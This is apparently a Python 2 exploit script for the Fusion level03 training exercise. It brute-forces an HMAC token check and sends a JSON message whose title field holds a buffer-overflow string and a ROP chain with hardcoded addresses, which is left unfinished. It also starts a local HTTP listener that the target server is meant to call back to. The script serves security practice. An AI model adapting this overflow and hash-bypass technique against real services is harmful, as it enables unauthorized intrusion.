#!/usr/bin/env python

import hmac
from hashlib import sha1
import json, random, string
import struct
from socket import *
import time
import SimpleHTTPServer
import SocketServer

BANNER = "\"// 127.0.0.1:43684-1600723263-1988662041-2103363159-646084226\"\n"

def p(x):
	return struct.pack("<I", x)

def listener():
	global l
	print(" [+] Initialize listener")
	Handler = SimpleHTTPServer.SimpleHTTPRequestHandler
	httpd = SocketServer.TCPServer(("", 8080), Handler)

	httpd.serve_forever()
	'''
	l = socket(AF_INET, SOCK_STREAM)
	l.bind(("", 8080))
	l.listen(1)
	conn, addr = l.accept()
	conn.recv(8)
	
	#l.listen(5)
	#print(conn)
	'''


def init_connection():
	global s
	print(" [+] Initialize connection")
	s = socket(AF_INET, SOCK_STREAM)
	s.connect(("localhost", 20003))
	banner = s.recv(len(BANNER)+1)
	token = banner.split('"')[1]
	print(" [+] token: %s" % token)
	return token

def getRop():
	generate_token = 0x8049950
	exit = 0xb751c9e0
	memcpy = 0x08048e60
	gToken = 0x0804bdf8
	send_token = 0x08049950
	
	x = ""
	#x += p(send_token)
	return x

def computeHash(token):
	payload = ''
	contents = 'JAKE!!'
	buffer = 'A'*27+'\\u1111'
	padding = 'a'*31
	rop = getRop()
	while(True):
		title = ''.join([random.choice(string.ascii_letters + string.digits) for n in xrange(100)])
		msg = json.dumps(
			{"tags":("A"), 
			 "title":title + buffer + padding + rop, 
			 "contents":contents, 
			 "serverip":"192.168.12.131:8080"}, ensure_ascii=False)
		payload = token + "\n" + msg
		hashed = hmac.new(bytearray(token), bytearray(payload), sha1)
		if (hashed.hexdigest().startswith('0000')):
			print(" [+] hash: " + hashed.hexdigest())
			print(" [+] payload: " + payload)
			break
	return payload

print("\nExploit Exercises - Fusion Level03")
print("------------------------------------")
token = init_connection()
payload = computeHash(token)
listener()
s.send(payload)

